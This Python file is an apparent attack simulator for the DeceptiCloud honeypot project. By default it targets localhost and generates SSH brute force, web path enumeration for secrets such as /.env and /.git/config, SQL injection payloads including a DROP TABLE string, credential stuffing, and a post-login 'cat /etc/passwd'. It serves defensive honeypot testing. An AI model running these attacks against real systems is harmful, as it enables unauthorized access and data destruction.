#!/usr/bin/env python3
"""
Attack Simulation Script for DeceptiCloud Local Testing

This script simulates realistic attack patterns against local honeypots.
Run this WHILE the RL agent is training to generate attack traffic.

Usage:
    python scripts/simulate_attacks.py --duration 300 --intensity medium
"""

import argparse
import time
import random
import sys
import requests
import paramiko
from datetime import datetime


class AttackSimulator:
    """Simulates various attack patterns against honeypots."""

    def __init__(self, ssh_host="localhost", ssh_port=2222, web_host="localhost", web_port=8080):
        self.ssh_host = ssh_host
        self.ssh_port = ssh_port
        self.web_host = web_host
        self.web_port = web_port

        # Attack patterns
        self.ssh_usernames = ['root', 'admin', 'ubuntu', 'user', 'test', 'guest']
        self.ssh_passwords = ['password', '123456', 'admin', 'root', 'toor', '12345']

        self.web_paths = [
            '/',
            '/admin',
            '/login',
            '/wp-admin',
            '/phpmyadmin',
            '/.env',
            '/.git/config',
            '/backup.sql',
            '/config.php',
            '/api/users',
            '/api/v1/auth',
            '/robots.txt',
        ]

        self.user_agents = [
            'Mozilla/5.0 (compatible; Botnet/1.0)',
            'sqlmap/1.0',
            'Nmap Scripting Engine',
            'nikto/2.1.6',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
        ]

    def ssh_brute_force(self, attempts=5):
        """Simulate SSH brute force attack."""
        print(f"\n[SSH Attack] Starting brute force ({attempts} attempts)...")

        for i in range(attempts):
            user = random.choice(self.ssh_usernames)
            pwd = random.choice(self.ssh_passwords)

            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(
                    self.ssh_host,
                    port=self.ssh_port,
                    username=user,
                    password=pwd,
                    timeout=5,
                    allow_agent=False,
                    look_for_keys=False
                )

                print(f"  ✓ Attempt {i+1}: {user}:{pwd} - SUCCESS (logged)")

                # If successful, try some commands
                stdin, stdout, stderr = ssh.exec_command('whoami')
                stdin, stdout, stderr = ssh.exec_command('cat /etc/passwd')
                stdin, stdout, stderr = ssh.exec_command('ls -la /home')

                ssh.close()
                break

            except paramiko.AuthenticationException:
                print(f"  ✗ Attempt {i+1}: {user}:{pwd} - FAILED (logged)")
            except Exception as e:
                print(f"  ⚠ Attempt {i+1}: Connection error - {type(e).__name__}")

            time.sleep(random.uniform(1, 3))

    def web_enumeration(self, paths_count=10):
        """Simulate web enumeration/scanning."""
        print(f"\n[Web Attack] Starting enumeration ({paths_count} paths)...")

        paths = random.sample(self.web_paths, min(paths_count, len(self.web_paths)))

        for i, path in enumerate(paths, 1):
            ua = random.choice(self.user_agents)
            try:
                response = requests.get(
                    f"http://{self.web_host}:{self.web_port}{path}",
                    headers={'User-Agent': ua},
                    timeout=5
                )
                print(f"  ✓ Request {i}: GET {path} -> {response.status_code}")
            except requests.exceptions.RequestException as e:
                print(f"  ⚠ Request {i}: GET {path} -> {type(e).__name__}")

            time.sleep(random.uniform(0.5, 2))

    def sql_injection(self, attempts=5):
        """Simulate SQL injection attempts."""
        print(f"\n[SQL Attack] Starting SQLi attempts ({attempts} payloads)...")

        payloads = [
            "1' OR '1'='1",
            "admin'--",
            "1; DROP TABLE users--",
            "' UNION SELECT NULL--",
            "1' AND 1=1--",
        ]

        for i, payload in enumerate(payloads[:attempts], 1):
            try:
                response = requests.get(
                    f"http://{self.web_host}:{self.web_port}/api/users",
                    params={'id': payload},
                    timeout=5
                )
                print(f"  ✓ SQLi {i}: {payload[:30]}... -> {response.status_code}")
            except requests.exceptions.RequestException:
                print(f"  ⚠ SQLi {i}: {payload[:30]}... -> Connection error")

            time.sleep(random.uniform(0.5, 1.5))

    def credential_stuffing(self, attempts=3):
        """Simulate credential stuffing attack."""
        print(f"\n[Credential Stuffing] Trying common credentials ({attempts} attempts)...")

        credentials = [
            ('admin', 'admin123'),
            ('user', 'password'),
            ('root', 'toor'),
        ]

        for i, (user, pwd) in enumerate(credentials[:attempts], 1):
            try:
                response = requests.post(
                    f"http://{self.web_host}:{self.web_port}/login",
                    data={'username': user, 'password': pwd},
                    timeout=5
                )
                print(f"  ✓ Attempt {i}: {user}:{pwd} -> {response.status_code}")
            except requests.exceptions.RequestException:
                print(f"  ⚠ Attempt {i}: {user}:{pwd} -> Connection error")

            time.sleep(random.uniform(1, 2))

    def mixed_attack_pattern(self, intensity='medium'):
        """Run mixed attack pattern based on intensity."""
        intensity_map = {
            'low': {'ssh': 2, 'web': 5, 'sqli': 2, 'cred': 1},
            'medium': {'ssh': 5, 'web': 10, 'sqli': 5, 'cred': 3},
            'high': {'ssh': 10, 'web': 20, 'sqli': 10, 'cred': 5},
        }

        params = intensity_map.get(intensity, intensity_map['medium'])

        # Random order to simulate real attacker
        attacks = [
            ('ssh', lambda: self.ssh_brute_force(params['ssh'])),
            ('web', lambda: self.web_enumeration(params['web'])),
            ('sqli', lambda: self.sql_injection(params['sqli'])),
            ('cred', lambda: self.credential_stuffing(params['cred'])),
        ]

        random.shuffle(attacks)

        for attack_type, attack_func in attacks:
            attack_func()
            time.sleep(random.uniform(2, 5))


def main():
    parser = argparse.ArgumentParser(
        description='Simulate attacks against DeceptiCloud honeypots'
    )
    parser.add_argument(
        '--duration',
        type=int,
        default=300,
        help='Duration in seconds (default: 300)'
    )
    parser.add_argument(
        '--intensity',
        choices=['low', 'medium', 'high'],
        default='medium',
        help='Attack intensity (default: medium)'
    )
    parser.add_argument(
        '--ssh-port',
        type=int,
        default=2222,
        help='SSH honeypot port (default: 2222)'
    )
    parser.add_argument(
        '--web-port',
        type=int,
        default=8080,
        help='Web honeypot port (default: 8080)'
    )
    parser.add_argument(
        '--continuous',
        action='store_true',
        help='Run continuously until stopped'
    )

    args = parser.parse_args()

    print("=" * 60)
    print("DeceptiCloud Attack Simulator")
    print("=" * 60)
    print(f"Target: localhost:{args.ssh_port} (SSH), localhost:{args.web_port} (Web)")
    print(f"Intensity: {args.intensity}")
    print(f"Duration: {args.duration}s" + (" (continuous)" if args.continuous else ""))
    print("=" * 60)
    print("\n🔴 Simulating attacks... (Press Ctrl+C to stop)\n")

    simulator = AttackSimulator(
        ssh_port=args.ssh_port,
        web_port=args.web_port
    )

    start_time = time.time()
    iteration = 1

    try:
        while True:
            elapsed = time.time() - start_time

            if not args.continuous and elapsed >= args.duration:
                break

            print(f"\n{'='*60}")
            print(f"Attack Iteration {iteration} (Elapsed: {int(elapsed)}s)")
            print(f"{'='*60}")

            simulator.mixed_attack_pattern(intensity=args.intensity)

            iteration += 1

            if not args.continuous and elapsed >= args.duration:
                break

            # Wait before next iteration
            wait_time = random.uniform(5, 15)
            print(f"\nWaiting {wait_time:.1f}s before next attack wave...")
            time.sleep(wait_time)

    except KeyboardInterrupt:
        print("\n\n⚠️  Attack simulation stopped by user")

    elapsed = time.time() - start_time
    print("\n" + "=" * 60)
    print("Attack Simulation Complete")
    print("=" * 60)
    print(f"Total duration: {int(elapsed)}s")
    print(f"Iterations completed: {iteration - 1}")
    print("\nCheck honeypot logs for captured attacks:")
    print("  docker logs cowrie_honeypot_local")
    print("  docker logs nginx_honeypot_local")
    print("")


if __name__ == '__main__':
    main()
